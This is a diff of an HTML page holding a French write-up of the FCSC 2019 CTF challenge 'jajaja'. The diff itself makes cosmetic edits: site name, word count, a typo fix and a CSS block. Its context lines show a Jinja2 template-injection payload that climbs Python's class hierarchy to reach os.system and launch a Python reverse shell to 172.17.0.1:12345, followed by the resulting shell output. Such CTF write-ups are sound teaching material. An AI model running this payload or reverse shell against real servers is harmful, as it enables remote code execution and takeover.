@@ -69,7 +69,7 @@
 <meta name="twitter:title" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
 <meta itemprop="name" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
 <meta name="application-name" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
-<meta property="og:site_name" content="Poison" />
+<meta property="og:site_name" content="Thibaud Labat" />
 
 
 <meta name="description" content="" />
@@ -102,7 +102,7 @@
 <meta property="fb:admins" content="" />
 
 
-<meta name="apple-mobile-web-app-title" content="Poison" />
+<meta name="apple-mobile-web-app-title" content="Thibaud Labat" />
 <meta name="apple-mobile-web-app-capable" content="yes" />
 <meta name="apple-mobile-web-app-status-bar-style" content="black" />
 
@@ -121,9 +121,6 @@
 
 
 
-  <meta name="news_keywords" content="writeup" />
-  <meta property="article:section" content="writeup" />
-
 
 <script defer type="application/ld+json">
   {
@@ -136,7 +133,7 @@
     },
     "datePublished": "2024-03-19",
     "description": "",
-    "wordCount": "1853",
+    "wordCount": "1856",
     "mainEntityOfPage": "True",
     "dateModified": "2024-03-19",
     "image": {
@@ -145,7 +142,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Poison",
+      "name": "Thibaud Labat",
       "logo": {
         "@type": "imageObject",
         "url": ""
@@ -162,7 +159,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.178e339ccb9acabffeebf9adbb0bb23c1ec0b72a2a50edee18a5007d4d5a68aa.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.a8fae66a2af09c54954c03953fb821a63894d3cdb4f06fd56f21450d62edb832.css">
 
 
     
@@ -394,7 +391,7 @@
         <p class="footnote">
 powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
     <br>
-    &copy; 2024 Poison. All rights reserved.
+    &copy; 2024 Thibaud Labat. All rights reserved.
 </p>
 
   </div>
@@ -506,7 +503,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span></code></pre></div><p>Malheureusement, il n&rsquo;en est rien, et on se prend une erreur 500 :(</p>
 <p>La raison de cette erreur ici est que <code>__import__</code> est une fonction <em>built-in</em> innacessible dans le contexte des <em>templates Jinja2</em>. En fait, on ne sait même pas à quoi on a accès. Probablement pas grand-chose.</p>
 <h2 id="chasse-au-trésor">Chasse au trésor</h2>
-<p>Nous ne savons pas à quelles variables ou fonctions nous avons accès, mais nous avons toujours accès aux constantes faisant partie du langage : <code>[]</code>, <code>0</code>, <code>&quot;&quot;</code>, etc. À partir de celles, nous pouvons retrouver, grâce aux attributs spéciaux des variables Python, toutes les classes importées dans le <em>script</em>, et nous en servir. À partir de la chaîne de caractère vide, on récupère la classe <code>str</code>, puis sa classe parent <code>object</code>, puis toutes les classes enfant de <code>object</code>&hellip; c&rsquo;est-à-dire toutes les classes.</p>
+<p>Nous ne savons pas à quelles variables ou fonctions nous avons accès, mais nous avons toujours accès aux constantes faisant partie du langage : <code>[]</code>, <code>0</code>, <code>&quot;&quot;</code>, etc. À partir de celles-ci, nous pouvons retrouver, grâce aux attributs spéciaux des variables Python, toutes les classes importées dans le <em>script</em>, et nous en servir. À partir de la chaîne de caractère vide, on récupère la classe <code>str</code>, puis sa classe parent <code>object</code>, puis toutes les classes enfant de <code>object</code>&hellip; c&rsquo;est-à-dire toutes les classes.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__
@@ -607,7 +604,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;172.17.0.1&#34;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </span></span></code></pre></div><p>Ce qui donne, enrobé dans notre <em>payload</em> d&rsquo;injection de commande shell :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]()<span style="color:#f92672">.</span>load_module(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">172.17.0.1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>) }}
-</span></span></code></pre></div><p>On lance le <em>payload</em>, et la magie s&rsquo;opère. On a un *shell.</p>
+</span></span></code></pre></div><p>On lance le <em>payload</em>, et la magie s&rsquo;opère. On a un <em>shell</em> sur le serveur.</p>
 <pre tabindex="0"><code>/app $ ls
 content.json
 flag.txt
@@ -618,7 +615,15 @@ templates
 FCSC{****************************************}
 </code></pre><h2 id="conclusion">Conclusion</h2>
 <p>Passer par l&rsquo;extraction en aveugle n&rsquo;était sans doute pas la manière la plus rapide d&rsquo;obtenir le flag, mais je trouve qu&rsquo;on s&rsquo;est bien amusé :-).</p>
-
+<style>
+pre code {
+white-space: pre-wrap;
+} 
+/*
+    Sinon les payload débordent...
+    car les lignes sont longues.
+*/
+</style>
   <hr>
 <div class="footer">
     
